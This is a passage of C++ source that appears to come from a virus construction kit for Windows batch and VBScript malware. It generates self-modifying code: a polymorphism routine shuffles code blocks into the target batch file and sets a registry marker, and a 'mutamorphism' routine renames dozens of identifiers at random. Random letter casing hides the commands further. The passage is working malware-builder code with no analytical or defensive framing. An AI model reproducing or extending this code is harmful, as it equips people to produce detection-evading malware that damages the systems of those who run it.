        wstf(CaseRand("echo")+" "+CaseRand("set")+" " + polf + "=" + pols + ".opentextfile(\"%"+CaseRand("tmp")+"%\\" + polt + "."+tfre+"\")>>%"+CaseRand("tmp")+"%\\" + polk + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+pola+"=" + polf + ".readall>>%"+CaseRand("tmp")+"%\\" + polk + ".vbs" + ffos);
        wstf(CaseRand("echo")+" " + polf + ".close>>%"+CaseRand("tmp")+"%\\" + polk + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+poll+"=split(" + pola + ",vbcrlf)>>%"+CaseRand("tmp")+"%\\" + polk + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+pol1+"=0>>%"+CaseRand("tmp")+"%\\" + polk + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+pol2+"=0>>%"+CaseRand("tmp")+"%\\" + polk + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+polb+"=0>>%"+CaseRand("tmp")+"%\\" + polk + ".vbs" + ffos);
        wstf(CaseRand("echo")+" for each "+pol3+" in "+poll+">>%"+CaseRand("tmp")+"%\\" + polk + ".vbs" + ffos);
        wstf(CaseRand("echo")+" if "+pol1+"=0 then>>%"+CaseRand("tmp")+"%\\" + polk + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+polp+"="+polp+"&"+pol3+"&vbcrlf>>%"+CaseRand("tmp")+"%\\" + polk + ".vbs" + ffos);
        wstf(CaseRand("echo")+" else>>%"+CaseRand("tmp")+"%\\" + polk + ".vbs" + ffos);
        wstf(CaseRand("echo")+" if "+pol2+"=0 or "+pol2+"=1 or "+pol2+"=2 then>>%"+CaseRand("tmp")+"%\\" + polk + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+pol4+"="+pol4+"&"+pol3+"&vbcrlf>>%"+CaseRand("tmp")+"%\\" + polk + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+pol2+"="+pol2+"+1>>%"+CaseRand("tmp")+"%\\" + polk + ".vbs" + ffos);
        wstf(CaseRand("echo")+" else>>%"+CaseRand("tmp")+"%\\" + polk + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+pol5+"="+pol5+"&"+pol4+"&\""+polar+"\">>%"+CaseRand("tmp")+"%\\" + polk + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+polb+"="+polb+"+1>>%"+CaseRand("tmp")+"%\\" + polk + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+pol4+"="+pol3+"&vbcrlf>>%"+CaseRand("tmp")+"%\\" + polk + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+pol2+"=1>>%"+CaseRand("tmp")+"%\\" + polk + ".vbs" + ffos);
        wstf(CaseRand("echo")+" end if>>%"+CaseRand("tmp")+"%\\" + polk + ".vbs" + ffos);
        wstf(CaseRand("echo")+" end if>>%"+CaseRand("tmp")+"%\\" + polk + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+pol1+"="+pol1+"+1>>%"+CaseRand("tmp")+"%\\" + polk + ".vbs" + ffos);
        wstf(CaseRand("echo")+" next>>%"+CaseRand("tmp")+"%\\" + polk + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+polv+"=split("+pol5+",\""+polar+"\")>>%"+CaseRand("tmp")+"%\\" + polk + ".vbs" + ffos);
        wstf(CaseRand("echo")+" randomize>>%"+CaseRand("tmp")+"%\\" + polk + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+polr+"=int(rnd*"+polb+")>>%"+CaseRand("tmp")+"%\\" + polk + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+polp+"="+polp+"&"+polv+"("+polr+")>>%"+CaseRand("tmp")+"%\\" + polk + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+pol1+"=1>>%"+CaseRand("tmp")+"%\\" + polk + ".vbs" + ffos);
        wstf(CaseRand("echo")+"  dim "+polu+","+pold+","+polub+","+poldb+">>%"+CaseRand("tmp")+"%\\" + polk + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+polu+"=1>>%"+CaseRand("tmp")+"%\\" + polk + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+pold+"=1>>%"+CaseRand("tmp")+"%\\" + polk + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+polub+"=0>>%"+CaseRand("tmp")+"%\\" + polk + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+poldb+"=0>>%"+CaseRand("tmp")+"%\\" + polk + ".vbs" + ffos);
        wstf(CaseRand("echo")+" do while not("+pol1+"="+polb+") and not("+pol1+"="+polb+"+1)>>%"+CaseRand("tmp")+"%\\" + polk + ".vbs" + ffos);
        wstf(CaseRand("echo")+" if ("+polr+"+"+polu+")="+polb+" then>>%"+CaseRand("tmp")+"%\\" + polk + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+polub+"=1>>%"+CaseRand("tmp")+"%\\" + polk + ".vbs" + ffos);
        wstf(CaseRand("echo")+" end if>>%"+CaseRand("tmp")+"%\\" + polk + ".vbs" + ffos);
        wstf(CaseRand("echo")+" if ("+polr+"-"+pold+")=-1 then>>%"+CaseRand("tmp")+"%\\" + polk + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+poldb+"=1>>%"+CaseRand("tmp")+"%\\" + polk + ".vbs" + ffos);
        wstf(CaseRand("echo")+" end if>>%"+CaseRand("tmp")+"%\\" + polk + ".vbs" + ffos);
        wstf(CaseRand("echo")+" if "+polub+"=0 then>>%"+CaseRand("tmp")+"%\\" + polk + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+polp+"="+polp+"&"+polv+"("+polr+"+"+polu+")>>%"+CaseRand("tmp")+"%\\" + polk + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+polu+"="+polu+"+1>>%"+CaseRand("tmp")+"%\\" + polk + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+pol1+"="+pol1+"+1>>%"+CaseRand("tmp")+"%\\" + polk + ".vbs" + ffos);
        wstf(CaseRand("echo")+" end if>>%"+CaseRand("tmp")+"%\\" + polk + ".vbs" + ffos);
        wstf(CaseRand("echo")+" if "+poldb+"=0 then>>%"+CaseRand("tmp")+"%\\" + polk + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+polp+"="+polp+"&"+polv+"("+polr+"-"+pold+")>>%"+CaseRand("tmp")+"%\\" + polk + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+pold+"="+pold+"+1>>%"+CaseRand("tmp")+"%\\" + polk + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+pol1+"="+pol1+"+1>>%"+CaseRand("tmp")+"%\\" + polk + ".vbs" + ffos);
        wstf(CaseRand("echo")+" end if>>%"+CaseRand("tmp")+"%\\" + polk + ".vbs" + ffos);
        wstf(CaseRand("echo")+" loop>>%"+CaseRand("tmp")+"%\\" + polk + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+polp+"="+polp+"&\":"+labelstr+"\"&vbcrlf>>%"+CaseRand("tmp")+"%\\" + polk + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+CaseRand("set")+" " + polf + "=" + pols + ".opentextfile(\""+istd+"\\" + tmpn + ".bat\",8)>>%"+CaseRand("tmp")+"%\\" + polk + ".vbs" + ffos);
        wstf(CaseRand("echo")+" " + polf + ".write "+polp+">>%"+CaseRand("tmp")+"%\\" + polk + ".vbs" + ffos);
        wstf(CaseRand("echo")+" " + polf + ".close>>%"+CaseRand("tmp")+"%\\" + polk + ".vbs" + ffos);
        wstf(CaseRand("echo")+" " + polH + ".regwrite \"HKCU\\Software\\" + plrn + "\\" + polX + "\",\""+polY+"\">>%"+CaseRand("tmp")+"%\\" + polk + ".vbs" + ffos);
        wstf(CaseRand("echo")+" end if>>%"+CaseRand("tmp")+"%\\" + polk + ".vbs" + ffos);
        wstf("cscript %"+CaseRand("tmp")+"%\\" + polk + ".vbs>nul" + ffos);
    }
    else wstf("find \"" + noso + "\"<%0>>"+istd+"\\" + tmpn + ".bat");
    if (Form15->CheckBox85->Checked)
    { // mutamorphism
        AnsiString mutX = StrRand(8, 0), mutY = StrRand(8, 1), mutH = StrRand(8, 0);
        wstf(CaseRand("echo")+".on error resume next>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+CaseRand("set")+" " + mutH + "=w%" + vbih + "%."+CaseRand("createobject")+"(\"w%" + vbih + "%.shell\")>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" if " + mutH + ".regread(\"HKCU\\Software\\" + plrn + "\\" + mutX + "\")=\"\" then>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" dim " + muta + ","+mutc+","+mutt+">>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+CaseRand("set")+" " + muts + "=w%" + vbih + "%."+CaseRand("createobject")+"(\"%" + vbih + "%ing.filesystemobject\")>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+CaseRand("set")+" " + mutf + "=" + muts + ".opentextfile(\""+istd+"\\" + tmpn + ".bat\")>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" " + muta + "=" + mutf + ".readall>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+"  " + mutf + ".close>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+noso+"\","+mutr+"(int(rnd*5)+2,3))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+kkns+"\","+mutr+"(int(rnd*5)+2,3))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+vbih+"\","+mutr+"(int(rnd*5)+2,3))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        if (Form15->RadioButton2->Checked == true || Form15->RadioButton5->Checked == true)
        {
            if ((Form15->CheckBox44->Checked == false) && (Form15->CheckBox11->Checked == true || Form15->CheckBox38->Checked == true))
                wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+pari+"\","+mutr+"(int(rnd*7)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
            if ((Form15->CheckBox44->Checked == false) && (Form15->CheckBox12->Checked == true || Form15->CheckBox25->Checked == true))
                wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+paiv+"\","+mutr+"(int(rnd*7)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
            if ((Form15->CheckBox44->Checked == false) && (Form15->CheckBox19->Checked == true || Form15->CheckBox26->Checked == true))
                wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+paij+"\","+mutr+"(int(rnd*7)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
            if ((Form15->CheckBox44->Checked == false) && (Form15->CheckBox36->Checked == true || Form15->CheckBox51->Checked == true || Form15->CheckBox52->Checked == true || Form15->CheckBox58->Checked == true))
                wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+paih+"\","+mutr+"(int(rnd*7)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        }
        if (Form15->CheckBox42->Checked == true || Form15->CheckBox45->Checked == true)
            wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+parp+"\","+mutr+"(int(rnd*7)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        if (Form15->CheckBox41->Checked == true)
            wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+parf+"\","+mutr+"(int(rnd*7)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        if (Form15->CheckBox53->Checked == true)
            wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+prsd+"\","+mutr+"(int(rnd*7)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" randomize>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+tmps+"\","+mutr+"(int(rnd*9)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+vtmr+"\","+mutr+"(int(rnd*7)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+vint+"\","+mutr+"(int(rnd*6)+2,3))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+tmpw+"\","+mutr+"(int(rnd*7)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+tfre+"\","+mutr+"(int(rnd*1)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+jsfs+"\","+mutr+"(int(rnd*8)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+jsws+"\","+mutr+"(int(rnd*9)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+vbib+"\","+mutr+"(int(rnd*8)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+sfso+"\","+mutr+"(int(rnd*9)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+wshl+"\","+mutr+"(int(rnd*8)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+fvw1+"\","+mutr+"(int(rnd*9)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+exts+"\","+mutr+"(int(rnd*3)+2,3))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+dtr1+"\","+mutr+"(int(rnd*5)+2,3))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+dtr2+"\","+mutr+"(int(rnd*4)+2,3))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+rsss+"\","+mutr+"(int(rnd*4)+2,3))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        if (Form15->CheckBox61->Checked)
            wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+mss2+"\","+mutr+"(int(rnd*5)+2,3))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        if (Form15->CheckBox24->Checked == true)
            wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+ebds+"\","+mutr+"(int(rnd*5)+2,3))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" randomize>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+ovft+"\","+mutr+"(int(rnd*7)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+mnra+"\","+mutr+"(int(rnd*7)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+favc+"\","+mutr+"(int(rnd*5)+2,3))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+dfrv+"\","+mutr+"(1,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+sdrv+"\","+mutr+"(int(rnd*8)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+sfld+"\","+mutr+"(int(rnd*9)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+drvs+"\","+mutr+"(int(rnd*8)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+fldf+"\","+mutr+"(int(rnd*9)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+flds+"\","+mutr+"(int(rnd*8)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+fldt+"\","+mutr+"(int(rnd*9)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+aiif+"\","+mutr+"(int(rnd*8)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+aiia+"\","+mutr+"(int(rnd*9)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+diia+"\","+mutr+"(int(rnd*8)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+dia2+"\","+mutr+"(int(rnd*9)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+rssa+"\","+mutr+"(int(rnd*8)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+rssk+"\","+mutr+"(int(rnd*9)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+rssm+"\","+mutr+"(int(rnd*8)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" randomize>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+fvw1+"\","+mutr+"(int(rnd*9)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+fvw2+"\","+mutr+"(int(rnd*8)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+fvw6+"\","+mutr+"(int(rnd*9)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+fvw5+"\","+mutr+"(int(rnd*8)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+jsfs+"\","+mutr+"(int(rnd*9)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+jsws+"\","+mutr+"(int(rnd*8)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+dihf+"\","+mutr+"(int(rnd*9)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+dihx+"\","+mutr+"(int(rnd*8)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+sdfv+"\","+mutr+"(int(rnd*9)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+emnk+"\","+mutr+"(int(rnd*8)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+sdv1+"\","+mutr+"(int(rnd*9)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+sdv2+"\","+mutr+"(int(rnd*8)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+sdv3+"\","+mutr+"(int(rnd*9)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+emnf+"\","+mutr+"(int(rnd*8)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+pfdc+"\","+mutr+"(int(rnd*9)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+emnn+"\","+mutr+"(int(rnd*8)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+emn1+"\","+mutr+"(int(rnd*9)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+emnt+"\","+mutr+"(int(rnd*8)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+emnd+"\","+mutr+"(int(rnd*9)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" randomize>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+vbir+"\","+mutr+"(int(rnd*8)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+vbic+"\","+mutr+"(int(rnd*9)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+vbim+"\","+mutr+"(int(rnd*8)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+vbik+"\","+mutr+"(int(rnd*9)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+lfdc+"\","+mutr+"(int(rnd*8)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+msv2+"\","+mutr+"(int(rnd*9)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+msv3+"\","+mutr+"(int(rnd*8)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+msfv+"\","+mutr+"(int(rnd*9)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+msoa+"\","+mutr+"(int(rnd*8)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+msma+"\","+mutr+"(int(rnd*9)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+msal+"\","+mutr+"(int(rnd*8)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+msae+"\","+mutr+"(int(rnd*9)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+msci+"\","+mutr+"(int(rnd*8)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+ispv+"\","+mutr+"(int(rnd*9)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+cspf+"\","+mutr+"(int(rnd*8)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+cfpf+"\","+mutr+"(int(rnd*9)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+cmpf+"\","+mutr+"(int(rnd*8)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+vbib+"\","+mutr+"(int(rnd*8)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+vbv3+"\","+mutr+"(int(rnd*9)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+plk3+"\","+mutr+"(int(rnd*8)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" randomize>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+sfrx+"\","+mutr+"(int(rnd*9)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+sfrk+"\","+mutr+"(int(rnd*8)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+cspv+"\","+mutr+"(int(rnd*9)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+cmpv+"\","+mutr+"(int(rnd*8)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+cfpv+"\","+mutr+"(int(rnd*9)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+vbv1+"\","+mutr+"(int(rnd*8)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+vbv2+"\","+mutr+"(int(rnd*9)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+plrn+"\","+mutr+"(int(rnd*8)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+plk1+"\","+mutr+"(int(rnd*9)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+plk2+"\","+mutr+"(int(rnd*8)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+sfso+"\","+mutr+"(int(rnd*9)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+wshl+"\","+mutr+"(int(rnd*8)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
